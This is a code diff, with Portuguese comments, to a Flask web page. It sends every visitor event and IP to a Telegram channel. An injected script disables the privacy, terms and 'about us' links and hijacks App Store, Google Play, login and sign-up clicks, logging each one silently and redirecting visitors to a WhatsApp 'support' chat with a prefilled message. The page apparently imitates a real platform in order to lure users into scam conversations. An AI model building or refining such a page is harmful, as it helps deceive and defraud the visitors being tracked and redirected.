@@ -66,50 +66,21 @@ def notify_telegram(log_entry):
     text += f"━━━━━━━━━━━━━━━━━━━━\n"
     text += f"🛡️ <i>Informações validadas e protegidas</i>"
     
-    with db_lock:
-        db = load_db()
-        if 'sessions' not in db:
-            db['sessions'] = {}
-            
-        session = db['sessions'].get(ip)
-        message_id = session.get('message_id') if session else None
-
-    # Try to edit the existing message for this IP to prevent spam
-    success_edit = False
-    if message_id:
-        url = f"https://api.telegram.org/bot{token}/editMessageText"
-        payload = {
-            "chat_id": channel_id,
-            "message_id": message_id,
-            "text": text,
-            "parse_mode": "HTML"
-        }
-        try:
-            r = requests.post(url, json=payload, timeout=5).json()
-            if r.get('ok'):
-                success_edit = True
-        except:
-            pass
-
-    # If edit failed or no previous message, send a new one
-    if not success_edit:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {
-            "chat_id": channel_id,
-            "text": text,
-            "parse_mode": "HTML"
-        }
-        try:
-            r = requests.post(url, json=payload, timeout=5).json()
-            if r.get('ok'):
-                new_msg_id = r['result']['message_id']
-                with db_lock:
-                    db = load_db()
-                    if 'sessions' not in db: db['sessions'] = {}
-                    db['sessions'][ip] = {'message_id': new_msg_id}
-                    save_db(db)
-        except:
-            pass
+    # Envia uma nova mensagem sempre para que o celular do usuário apite (notificação)
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {
+        "chat_id": channel_id,
+        "text": text,
+        "parse_mode": "HTML"
+    }
+    try:
+        r = requests.post(url, json=payload, timeout=5).json()
+        if not r.get('ok'):
+            with open('bot_error.log', 'a') as f:
+                f.write('Send not ok: ' + str(r) + '\n')
+    except Exception as e:
+        with open('bot_error.log', 'a') as f:
+            f.write('Send error: ' + str(e) + '\n')
 
 def load_db():
     import time
@@ -208,7 +179,13 @@ def log_event(event_type, action=None):
         db['logs'].append(log_entry)
         save_db(db)
     
-    threading.Thread(target=notify_telegram, args=(log_entry,)).start()
+    # Executa de forma síncrona para evitar que o Passenger mate a thread antes de enviar
+    try:
+        notify_telegram(log_entry)
+    except Exception as e:
+        with open('bot_error.log', 'a') as f:
+            f.write(str(e) + '\n')
+        
     return log_entry
 
 @app.route('/')
@@ -263,27 +240,71 @@ def index():
         var target = e.target;
         var a = target.closest('a'); 
         
-        var text = (target.innerText || '').trim().toLowerCase();
+        var text = (target.textContent || target.innerText || '').trim().toLowerCase();
         if (text === 'conheça a gente' || text === 'política de privacidade' || text === 'termos e condições' || (a && a.getAttribute('href') === '#')) {
             e.preventDefault();
             e.stopPropagation();
             return false;
         }
 
-        var isBadgeOrStore = target.closest('[class*="badge"]') || target.closest('[alt*="App Store"]') || target.closest('[alt*="Google Play"]') || (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre');
+        var altText = '';
+        var img = target.closest('img');
+        if (img) {
+            altText = (img.getAttribute('alt') || '').toLowerCase();
+        }
+        var srcText = '';
+        if (img) {
+            srcText = (img.getAttribute('src') || '').toLowerCase();
+        }
+
+        var isAppStore = altText.includes('app store') || srcText.includes('app-store') || srcText.includes('apple') || srcText.includes('ios');
+        var isGooglePlay = altText.includes('google play') || srcText.includes('google-play') || srcText.includes('play-store');
+        
+        var isBadgeOrStore = target.closest('[class*="badge"]') || isAppStore || isGooglePlay || 
+                             (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || 
+                             text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar');
         
         if (isBadgeOrStore) { 
-            e.preventDefault(); 
-            e.stopPropagation(); 
             var action = 'geral';
-            if (text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || (a && a.getAttribute('href') && a.getAttribute('href').includes('/login'))) {
+            if (text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar') || (a && a.getAttribute('href') && a.getAttribute('href').includes('/login'))) {
                 action = 'atendimento';
-            } else if (text.includes('baixar') || text.includes('app store') || text.includes('google play') || target.closest('[class*="badge"]') || target.closest('[alt*="App Store"]') || target.closest('[alt*="Google Play"]')) {
+            } else if (text.includes('baixar') || isAppStore || isGooglePlay || target.closest('[class*="badge"]')) {
                 action = 'download';
             } else if (text.includes('como funciona') || text.includes('dúvida')) {
                 action = 'ajuda';
             }
-            window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action) + '&t=' + new Date().getTime(); 
+            
+            // Registra o clique no backend silenciosamente
+            fetch('/redirect_whatsapp?action=' + encodeURIComponent(action) + '&t=' + new Date().getTime(), { mode: 'no-cors' });
+
+            e.preventDefault(); 
+            e.stopPropagation(); 
+
+            // Pega o href da tag A se existir, senao usa o wa.me genérico
+            var targetUrl = 'https://wa.me/0800-887-1111';
+            if (a && a.getAttribute('href') && (a.getAttribute('href').includes('wa.me') || a.getAttribute('href').includes('whatsapp'))) {
+                targetUrl = a.getAttribute('href');
+            }
+            
+            // Adiciona a mensagem de apresentacao
+            var hr = new Date().getHours();
+            var saudacao = "Olá";
+            if (hr >= 5 && hr < 12) saudacao = "Bom dia";
+            else if (hr >= 12 && hr < 18) saudacao = "Boa tarde";
+            else saudacao = "Boa noite";
+            
+            var msg = saudacao + "! Gostaria de saber mais informações.";
+            if (action === 'atendimento') msg = saudacao + "! Preciso de atendimento sobre a plataforma.";
+            else if (action === 'download') msg = saudacao + "! Gostaria de solicitar acesso ao aplicativo.";
+            else if (action === 'ajuda') msg = saudacao + "! Tenho uma dúvida de como funciona a plataforma.";
+
+            if (targetUrl.indexOf('?') !== -1) {
+                targetUrl = targetUrl.split('?')[0];
+            }
+            targetUrl = targetUrl + "?text=" + encodeURIComponent(msg);
+            
+            // Redireciona imediatamente sem setTimeout para o Safari não bloquear
+            window.location.href = targetUrl;
         } 
     }, true);
     </script>
